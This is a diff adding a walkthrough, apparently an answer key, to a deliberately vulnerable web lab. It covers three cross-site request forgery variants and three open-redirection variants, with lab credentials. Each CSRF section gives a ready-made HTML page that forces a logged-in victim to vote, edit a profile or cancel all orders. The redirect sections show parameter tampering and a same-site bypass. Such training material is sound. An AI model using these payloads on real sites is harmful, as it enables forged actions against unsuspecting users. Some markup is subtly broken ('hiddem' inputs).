@@ -671,10 +671,132 @@ You do not have the credentials to the account given below. Can you look for som
 
 
 
+## Cross Site Request Forgery Variant 1(GET Based)
+
+### query:
+/Cross-Site-Request-Forgery/Variant-1/vote.php?id=1
+
+
+### task:
+Login to this website using the credentials given below. See if the website is vulnerable to CSRF and if you can change the votes given by any of the users from their accounts.
+(User credentials: hacker:hacker@123, victim1:victim#123, victim2:victim2@123)
+
+### paylaod:
+*hacker can easily tamper with id parameter*
+
+*hacker can craft a html page like this if he wants user to vote for candidate 1 and downvote for candidate 2 and send this page link to user to open with the authenticated browser*
+
+<html>
+<body>
+	<img src="http://13.232.47.0/Cross-Site-Request-Forgery/Variant-1/vote.php?id=1">
+
+	<img src="http://13.232.47.0/Cross-Site-Request-Forgery/Variant-1/downvote.php?id=2">
+</body>
+</html>
 
 
 
+## Cross Site Request Forgery Variant 2(POST Based)
 
+### query:
+name=John&age=28&mobile=846516513address=77%2C+Leelawati+Nagar%2C+Gujarat-+000000
+
+### task:
+Login to the website using the credentials given below. See if the profile page of the user is vulnerable to CSRF.
+(User credentials: hacker:hacker@123, victim:victim#123)
+
+### payload:
+*here if we intercept request using Burp, we get to know that user can easily tamper with the data, the Refer header is been sent but it is not checked at all on server side *
+
+*so hacker can craft a html form with post request like this and sent link to victim, which victim has to open with the authencticated bowser only*
+
+<html>
+<body>
+	 <form action="http://13.232.47.0/Cross-Site-Request-Forgery/Variant-2/edit_profile.php" method="post">
+  <input type="hidden" id="name" name="name" value="John"><br>
+<input type="hidden" name="age" id="age" value="28">
+
+<input type="hiddem" name="mobile" id="mobile" value="+91 0000 1118777">
+<input type="hiddem" name="address" id="address" value="hacked, 77, Leelawati Nagar, Assam- 1234567">
+
+  <input type="submit" value="Submit">
+	</form> 
+
+
+</body>
+</html>
+
+
+
+## Cross Site Request Forgery Variant 3
+
+### query:
+/Cross-Site-Request-Forgery/Variant-3/cancel.php?all
+(GET method query)
+
+### task:
+Login to the account given below using the following credentials.
+(User credentials: hacker:hacker@123, victim:victim#123)
+See if the web page is vulnerable to CSRF and if you can cancel all orders for the user.
+
+### payload:
+*as we are able to temper with GET request with burp and also Refer Header is not being checked* 
+*hacker can frame HTML page to send GET req to cancel all req and send this link to victim, which he has to open with authenticated browser which cancels all orders*
+
+<html>
+<body>
+	 <img src="http://13.232.47.0/Cross-Site-Request-Forgery/Variant-3/cancel.php?all"> 
+</body>
+</html>
+
+
+## Open Redirection Variant 1
+
+### query:
+http://13.232.47.0/Open-Redirection/Variant-1/login.php?continue=report.php?id=354956
+(POST req)
+
+### task:
+Use the credentials given below to login to the account. See if the website is vulnerable to Open Redirection and if the user can be redirected to some other website, instead of the medical report.
+(User credentials: medical1:medical@123)
+
+### payload:
+*we are easily able to tamper with continue parameter*
+
+*change continue to http://google.com it will forward you to google.com insted of that pdf file*
+
+
+## Open Redirection Variant 2
+
+### query:
+/Open-Redirection/Variant-2/redirect.php?dest=dhl.com/track/125625659
+
+### task:
+See if you can re-direct the user to some other website.
+
+### payload:
+*dest parameter can be tampered easily replace it with google.com, and it just fordward page to google.com*
+
+
+## Open Redirection Variant 3
+
+### query:
+login:
+/Open-Redirection/Variant-3/profile.php
+
+logout:
+/Open-Redirection/Variant-3/logout.php?to=http://13.232.47.0/Open-Redirection/Variant-3/
+
+### task:
+Click on the 'log in' button to directly login to the account without credentials. Now see if some redirection is happening on this page and if you can use it to re-direct the user to some other website.
+
+
+### payload:
+*we can tamper with the logout request 'to' parameter, replace it with google.com it will not forward to google.com, it will forward only to the links present on 13.232.47 server*
+
+*the website is checking if the to= actually contains a URL of this same website or not.*
+
+*so try replace it with to=http://13.232.47.0/Open-Redirection/Variant-3/profile.php this will again make user to go to logged in page*
 
 
 
